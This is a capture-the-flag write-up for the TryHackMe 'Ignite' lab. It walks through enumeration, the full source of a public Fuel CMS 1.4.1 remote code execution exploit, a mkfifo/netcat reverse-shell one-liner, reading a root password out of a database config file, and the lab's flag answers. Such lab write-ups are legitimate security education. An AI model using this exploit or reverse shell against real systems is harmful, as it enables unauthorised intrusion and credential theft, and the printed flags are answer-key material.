Swatish Attaluri
Date: 11-06-2021
## Ignite - Tryhackme
### Machine IP: 10.10.208.6
#### Nmap scan
```bash
$ nmap -sC -sC -oN ports 10.10.208.6
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-11 17:54 IST
Nmap scan report for 10.10.208.6
Host is up (0.16s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 1 disallowed entry                                                   
|_/fuel/                                                                                        
|_http-title: Welcome to FUEL CMS                                                                  
                                                                                                           
Nmap done: 1 IP address (1 host up) scanned in 40.37 seconds    
```
#### Gobuster
```bash
$ gobuster dir -u 10.10.208.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.208.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/11 17:55:39 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 16593]
/home                 (Status: 200) [Size: 16593]
/0                    (Status: 200) [Size: 16593]
/assets               (Status: 301) [Size: 311] [--> http://10.10.208.6/assets/]
/'                    (Status: 400) [Size: 1134]                                
Progress: 4312 / 220561 (1.96%)  
```
#### Gaining a reverse shell
The fuel CMS version is 1.4
Lets see if we have something on searchsploit
```bash
$ searchsploit fuel                     
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path                    | windows/local/49535.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities         | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                | php/webapps/49487.rb
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)          | php/webapps/48778.txt
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
We have remote code execution(2 of them) lets try with the first one.
Download the exploit:
```bash
$ searchsploit -m linux/webapps/47138.py
```
Looking into the python code:
```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://10.10.109.213/"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+requests.utils.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print(r.text[0:dup])
```
Change the url to machine IP.
Looks like we need to open burp as the response is being redirected to proxy.
Turn on the intercept.
```python
$ python3 rce.py                                                                                    
cmd:ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
```
This result comes after we send the request in the repeater.
Now, lets use bash reverse shell in our python file in cmd input field
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc local_IP 9001 >/tmp/f
```
In another terminal open nc on our local machine on port 9001 
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.17.6.214] from (UNKNOWN) [10.10.109.213] 56738
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ cd home
cd home
bash: cd: home: No such file or directory
www-data@ubuntu:/var/www/html$ ls
ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
www-data@ubuntu:/var/www/html$ cd /home/
cd /home/
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```
#### Privilege Escalation
From the reference from a writeup, we are able to find the root password from a database.php file in config of our fuel application.
```bash
$ cat /var/www/html/fuel/application/config/database.php
'username' => 'root',
'password' => 'mememe',
```
Login as root
```bash
$ su root
su root
Password: mememe
# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```
#### Answers
```
User.txt
6470e394cbf6dab6a91682cc8585059b
Root.txt
b9bbcb33e11b80be759c4e844862482d
```
#python
#bash